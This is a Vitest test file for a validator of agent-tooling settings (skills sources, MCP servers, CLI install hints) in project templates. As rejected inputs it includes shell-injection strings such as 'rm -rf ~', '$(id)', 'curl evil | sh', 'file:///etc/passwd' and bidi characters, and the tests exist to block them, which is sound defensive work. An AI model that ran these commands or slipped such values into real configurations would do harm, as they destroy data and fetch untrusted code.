// biome-ignore-all lint/suspicious/noTemplateCurlyInString: these strings are template placeholders, not JavaScript templates.
import { describe, expect, it } from "vitest";
import {
	mcpPlaceholders,
	parseTemplateAgentTooling,
	placeholderNames,
	shellWordWithPlaceholders,
	substitutePlaceholders,
	TemplateToolingError,
} from "./agent_tooling";

const remote = (overrides: Record<string, unknown> = {}) => ({
	name: "context7",
	url: "https://mcp.context7.com/mcp",
	headers: { CONTEXT7_API_KEY: "${CONTEXT7_API_KEY}" },
	...overrides,
});

const stdio = (overrides: Record<string, unknown> = {}) => ({
	name: "stripe",
	command: ["npx", "-y", "@stripe/mcp", "--tools=all"],
	env: { STRIPE_SECRET_KEY: "${STRIPE_SECRET_KEY}" },
	...overrides,
});

const rejects = (value: unknown, message: RegExp) => {
	expect(() => parseTemplateAgentTooling(value)).toThrow(
		TemplateToolingError,
	);
	expect(() => parseTemplateAgentTooling(value)).toThrow(message);
};

describe("parseTemplateAgentTooling", () => {
	it("parses skills, both MCP server kinds, and both CLI kinds with defaults", () => {
		const tooling = parseTemplateAgentTooling({
			skills: [{ source: "vercel/ai", skills: ["ai-sdk"] }],
			mcp: [remote(), stdio({ recommended: false })],
			cli: [
				{ name: "inngest", npm: "inngest-cli@1.4.2" },
				{
					name: "stripe",
					minVersion: "1.21.0",
					install: {
						brew: "stripe/stripe-cli/stripe",
						url: "https://docs.stripe.com/stripe-cli",
					},
				},
			],
		});
		expect(tooling.skills).toEqual([
			{ source: "vercel/ai", skills: ["ai-sdk"], recommended: true },
		]);
		expect(tooling.mcp).toEqual([
			{
				name: "context7",
				recommended: true,
				kind: "remote",
				url: "https://mcp.context7.com/mcp",
				transport: "http",
				headers: { CONTEXT7_API_KEY: "${CONTEXT7_API_KEY}" },
			},
			{
				name: "stripe",
				recommended: false,
				kind: "stdio",
				command: ["npx", "-y", "@stripe/mcp", "--tools=all"],
				env: { STRIPE_SECRET_KEY: "${STRIPE_SECRET_KEY}" },
			},
		]);
		expect(tooling.cli).toEqual([
			{
				name: "inngest",
				recommended: true,
				kind: "npm",
				package: "inngest-cli@1.4.2",
			},
			{
				name: "stripe",
				recommended: true,
				kind: "system",
				minVersion: "1.21.0",
				install: {
					brew: "stripe/stripe-cli/stripe",
					url: "https://docs.stripe.com/stripe-cli",
				},
			},
		]);
	});

	it("accepts an https git URL as a skills source", () => {
		expect(
			parseTemplateAgentTooling({
				skills: [
					{
						source: "https://gitlab.com/acme/skills.git",
						skills: ["a"],
					},
				],
			}).skills[0]?.source,
		).toBe("https://gitlab.com/acme/skills.git");
	});

	it("rejects an empty block, unknown fields, and the old neonMcp field", () => {
		rejects({}, /needs skills, mcp, or cli/);
		rejects({ neonMcp: { readOnly: true } }, /unknown field "neonMcp"/);
		rejects({ mcp: [remote({ extra: 1 })] }, /unknown field "extra"/);
		rejects([], /must be an object/);
	});

	it("rejects skills sources a shell or git would interpret", () => {
		for (const source of [
			"./local",
			"/abs/path",
			"git@github.com:a/b.git",
			"http://example.com/a/b",
			"https://user:pw@example.com/a/b",
			"https://example.com/a/b;rm -rf ~",
			"https://example.com/$(id)",
			"owner/repo/extra",
			"owner/..",
		]) {
			rejects(
				{ skills: [{ source, skills: ["x"] }] },
				/must be owner\/repo or an https git URL/,
			);
		}
		rejects(
			{ skills: [{ source: "a/b", skills: ["Bad Name"] }] },
			/skills\[0\]/,
		);
		rejects(
			{ skills: [{ source: "a/b", skills: ["x", "x"] }] },
			/repeats a skill/,
		);
		rejects({ skills: [{ source: "a/b" }] }, /skills: is required/);
	});

	it("reserves the Neon server name in any case and refuses repeats", () => {
		rejects({ mcp: [remote({ name: "Neon" })] }, /reserved/);
		rejects({ mcp: [remote({ name: "neon" })] }, /reserved/);
		rejects(
			{ mcp: [remote(), remote({ name: "Context7" })] },
			/repeats the server "Context7"/,
		);
	});

	it("needs exactly one of url and command, with the matching fields", () => {
		rejects({ mcp: [{ name: "x" }] }, /exactly one of url or command/);
		rejects(
			{ mcp: [remote({ command: ["npx", "-y"] })] },
			/exactly one of url or command/,
		);
		rejects(
			{ mcp: [remote({ env: { A: "b" } })] },
			/env: is for command servers/,
		);
		rejects(
			{ mcp: [stdio({ headers: { A: "b" } })] },
			/transport and headers are for url servers/,
		);
		rejects({ mcp: [remote({ transport: "stdio" })] }, /"http" or "sse"/);
	});

	it("only takes https URLs without credentials or $", () => {
		for (const url of [
			"http://mcp.example.com/mcp",
			"file:///etc/passwd",
			"https://mcp.example.com/${env:HOME}",
			"https://mcp.example.com/ mcp",
		]) {
			rejects({ mcp: [remote({ url })] }, /must be an https URL/);
		}
		rejects(
			{
				mcp: [
					remote({ url: "https://user:secret@mcp.example.com/mcp" }),
				],
			},
			/must not carry credentials/,
		);
	});

	it("allows ${NAME} placeholders and refuses every other $ form agents expand", () => {
		for (const value of [
			"${env:GITHUB_TOKEN}",
			"${HOME:-x}",
			"$HOME",
			"Bearer ${lower}",
			"${A}$",
		]) {
			rejects(
				{ mcp: [remote({ headers: { Authorization: value } })] },
				/no other \$/,
			);
		}
		expect(
			parseTemplateAgentTooling({
				mcp: [
					remote({ headers: { Authorization: "Bearer ${TOKEN}" } }),
				],
			}).mcp[0],
		).toMatchObject({ headers: { Authorization: "Bearer ${TOKEN}" } });
	});

	it("refuses control, zero-width, and bidi characters anywhere a prompt shows them", () => {
		rejects(
			{ mcp: [remote({ description: "safe\u202eevil" })] },
			/printable/,
		);
		rejects(
			{ mcp: [remote({ headers: { A: "x\u001b[2J" } })] },
			/no other \$/,
		);
		rejects(
			{ mcp: [stdio({ command: ["npx", "a\u200bb"] })] },
			/printable/,
		);
		rejects(
			{ cli: [{ name: "x", npm: "x@1.0.0", description: "a\nb" }] },
			/printable/,
		);
	});

	it("constrains stdio commands so add-mcp cannot reparse them", () => {
		rejects({ mcp: [stdio({ command: ["npx"] })] }, /an executable and/);
		rejects(
			{ mcp: [stdio({ command: ["/usr/bin/node", "x"] })] },
			/bare executable name/,
		);
		rejects(
			{ mcp: [stdio({ command: ["./run.sh", "x"] })] },
			/bare executable name/,
		);
		rejects(
			{ mcp: [stdio({ command: ["https://evil", "x"] })] },
			/bare executable name/,
		);
		rejects(
			{ mcp: [stdio({ command: ["npx", "-y @evil/pkg"] })] },
			/must not contain whitespace/,
		);
		rejects(
			{ mcp: [stdio({ command: ["npx", "-y", "$(id)"] })] },
			/with no \$/,
		);
		rejects(
			{ mcp: [stdio({ env: { lower: "x" } })] },
			/malformed or repeated name/,
		);
	});

	it("pins npm CLIs exactly and keeps system CLIs to printable hints", () => {
		rejects({ cli: [{ name: "x", npm: "x@^1.0.0" }] }, /cli\[0\]\.npm/);
		rejects({ cli: [{ name: "x", npm: "x" }] }, /cli\[0\]\.npm/);
		rejects(
			{ cli: [{ name: "x", npm: "x@1.0.0", minVersion: "1.0.0" }] },
			/install and minVersion do not apply/,
		);
		rejects(
			{ cli: [{ name: "x" }] },
			/at least one of brew, winget, or url/,
		);
		rejects(
			{ cli: [{ name: "x", install: { brew: "x; curl evil | sh" } }] },
			/install\.brew/,
		);
		rejects(
			{ cli: [{ name: "x", install: { url: "http://example.com" } }] },
			/must be an https URL/,
		);
		rejects(
			{ cli: [{ name: "x", minVersion: "1.0", install: { brew: "x" } }] },
			/minVersion/,
		);
		rejects(
			{
				cli: [
					{ name: "x", npm: "x@1.0.0" },
					{ name: "x", npm: "y@1.0.0" },
				],
			},
			/repeats the CLI/,
		);
	});

	it("caps each list", () => {
		rejects(
			{
				cli: Array.from({ length: 11 }, (_, i) => ({
					name: `c${i}`,
					npm: `c${i}@1.0.0`,
				})),
			},
			/1 to 10 entries/,
		);
	});
});

describe("placeholders", () => {
	it("lists the names a value reads", () => {
		expect(placeholderNames("Bearer ${A}-${B_2}")).toEqual(["A", "B_2"]);
		expect(
			mcpPlaceholders({
				kind: "remote",
				name: "x",
				recommended: true,
				url: "https://x.dev",
				transport: "http",
				headers: { A: "${T}", B: "${T} ${U}" },
			}),
		).toEqual(["T", "U"]);
	});

	it("substitutes every name and refuses a missing one", () => {
		expect(substitutePlaceholders("Bearer ${T}", { T: "a$b" })).toBe(
			"Bearer a$b",
		);
		expect(() => substitutePlaceholders("${T}", {})).toThrow(
			/No value for T/,
		);
	});

	it("leaves placeholders for the user's shell when printing a command", () => {
		expect(
			shellWordWithPlaceholders("Authorization: Bearer ${TOKEN}"),
		).toBe(`'Authorization: Bearer '"$TOKEN"`);
		expect(shellWordWithPlaceholders("${A}")).toBe(`"$A"`);
		expect(shellWordWithPlaceholders("plain")).toBe("plain");
		expect(shellWordWithPlaceholders("it's; rm")).toBe(`'it'\\''s; rm'`);
		expect(shellWordWithPlaceholders("")).toBe("''");
	});
});
